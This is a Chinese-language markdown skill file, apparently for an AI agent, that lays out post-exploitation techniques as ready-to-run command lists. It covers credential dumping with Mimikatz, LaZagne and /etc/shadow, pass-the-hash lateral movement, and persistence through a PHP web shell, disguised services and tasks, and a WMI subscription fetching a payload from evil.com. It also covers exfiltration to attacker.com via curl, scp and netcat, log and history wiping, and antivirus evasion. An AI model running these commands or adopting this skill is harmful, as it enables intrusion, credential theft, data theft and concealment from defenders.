---
name: post-exploitation
description: 后渗透技术，包括信息收集、横向移动、权限维持和痕迹清除
---

# 后渗透技能

在获得系统访问权限后进行的后续操作。

## 信息收集

### 系统信息
```bash
# Linux
uname -a
cat /etc/*-release
hostname
whoami
id
groups

# Windows
systeminfo
hostname
whoami /all
net user
net localgroup administrators
```

### 网络信息
```bash
# Linux
ifconfig -a
ip addr show
ip route
netstat -tulpn
ss -tulpn
arp -a

# Windows
ipconfig /all
route print
netstat -ano
arp -a
```

### 进程和服务
```bash
# Linux
ps aux
top
systemctl list-units --type=service

# Windows
tasklist
Get-Process
Get-Service
wmic process list brief
```

### 已安装软件
```bash
# Linux
dpkg -l
rpm -qa
snap list

# Windows
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

## 凭据获取

### Linux
```bash
# 提取密码哈希
cat /etc/shadow

# 搜索密码文件
find / -name "*.conf" -exec grep -i "password" {} \; 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "db_password" /var/www/ 2>/dev/null

# SSH 密钥
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# 浏览器保存的密码
ls ~/.mozilla/firefox/*.default*/logins.json
ls ~/.config/google-chrome/Default/Login\ Data
```

### Windows
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets

# LaZagne (多合一密码提取)
laZagne.exe all

# 浏览器密码
# Chrome: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# Firefox: %AppData%\Mozilla\Firefox\Profiles\*.default\logins.json

# WiFi 密码
netsh wlan show profiles
netsh wlan show profile name="WIFI_NAME" key=clear

# 凭据管理器
cmdkey /list
vaultcmd /list
```

## 横向移动

### 内网扫描
```bash
# 主机发现
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes"; done

# 端口扫描（nc 探测常见端口）
for port in 22 80 135 139 443 445 3389; do nc -zv 192.168.1.100 $port 2>&1; done

# SMB 枚举
smbclient -L //192.168.1.100
enum4linux -a 192.168.1.100
```

### Pass-the-Hash
```bash
# Linux - pth-toolkit
pth-winexe -U domain/user%hash //target.com cmd

# Impacket
psexec.py -hashes :NTLM_HASH user@target.com
wmiexec.py -hashes :NTLM_HASH user@target.com
smbexec.py -hashes :NTLM_HASH user@target.com

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u user -H NTLM_HASH
crackmapexec smb target.com -u user -H hash --exec-method smbexec -x "whoami"
```

### PSExec
```bash
# Impacket
psexec.py domain/user:password@target.com

# Metasploit
use exploit/windows/smb/psexec
set RHOST target.com
set SMBUser administrator
set SMBPass password
run
```

### RDP
```bash
# xfreerdp
xfreerdp /u:administrator /p:password /v:target.com

# rdesktop
rdesktop -u administrator -p password target.com

# Restricted Admin Mode (PTH)
xfreerdp /u:administrator /pth:NTLM_HASH /v:target.com
```

### SSH 隧道
```bash
# 本地端口转发
ssh -L 8080:internal-host:80 user@jump-host

# 动态端口转发 (SOCKS 代理)
ssh -D 1080 user@jump-host
# 配置 proxychains 使用 socks5://127.0.0.1:1080

# 远程端口转发
ssh -R 8080:localhost:80 user@remote-host
```

## 权限维持

### Linux 后门

#### SSH 后门
```bash
# 添加 SSH 密钥
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 修改 SSH 配置允许密码登录
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

#### Cron 后门
```bash
# 添加定时任务
(crontab -l; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# System-wide cron
echo "*/5 * * * * root /tmp/backdoor.sh" >> /etc/crontab
```

#### Web Shell
```bash
# PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Python
python -m SimpleHTTPServer 8000 &
```

### Windows 后门

#### 注册表自启动
```powershell
# Run 键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# RunOnce 键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

#### 计划任务
```powershell
# 创建计划任务
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc onlogon /ru System
schtasks /create /tn "Backup" /tr "C:\backdoor.exe" /sc daily /st 09:00 /ru System
```

#### 服务后门
```powershell
# 创建服务
sc create backdoor binpath= "C:\backdoor.exe" start= auto
sc description backdoor "Windows Security Service"
sc start backdoor

# 修改现有服务
sc config vulnerable-service binpath= "C:\backdoor.exe"
```

#### WMI 事件订阅
```powershell
# 创建 WMI 后门
$filterName = 'FilterName'
$consumerName = 'ConsumerName'
$payload = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/payload.ps1'')"'

$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$payload}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

## 数据窃取

### 敏感文件
```bash
# Linux
find / -name "*.conf" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find /home -name "*.pdf" 2>/dev/null
find /home -name "*.doc*" 2>/dev/null

# Windows
dir /s /b C:\*.docx
dir /s /b C:\*.xlsx
dir /s /b C:\*.pdf
dir /s /b C:\*password*.txt
```

### 数据传输
```bash
# Base64 编码传输
cat sensitive.txt | base64 | curl -X POST -d @- http://attacker.com/upload

# SCP
scp sensitive.txt user@attacker.com:/tmp/

# Netcat
nc -lvnp 4444 > received.txt  # 接收端
nc attacker.com 4444 < sensitive.txt  # 发送端

# PowerShell 上传
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile sensitive.txt
```

## 痕迹清除

### Linux
```bash
# 清除命令历史
history -c
echo > ~/.bash_history
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# 清除日志
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/apache2/access.log

# 修改时间戳
touch -r /etc/passwd /tmp/backdoor.sh
```

### Windows
```powershell
# 清除事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName System
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application

# 清除 PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath

# 修改时间戳
$(Get-Item file.exe).creationtime=$(Get-Date "01/01/2020 12:00:00")
$(Get-Item file.exe).lastaccesstime=$(Get-Date "01/01/2020 12:00:00")
$(Get-Item file.exe).lastwritetime=$(Get-Date "01/01/2020 12:00:00")
```

## 免杀技术

### 编码混淆
```bash
# Base64
echo "payload" | base64

# Hex
echo "payload" | xxd -p

# Gzip + Base64
echo "payload" | gzip | base64
```

### 进程注入
```powershell
# PowerShell 反射注入
$bytes = [System.IO.File]::ReadAllBytes("C:\payload.dll")
[System.Reflection.Assembly]::Load($bytes)
```

### AV 规避
- 修改已知恶意代码签名
- 加壳加密
- 内存加载
- 使用合法程序 (LOLBins)
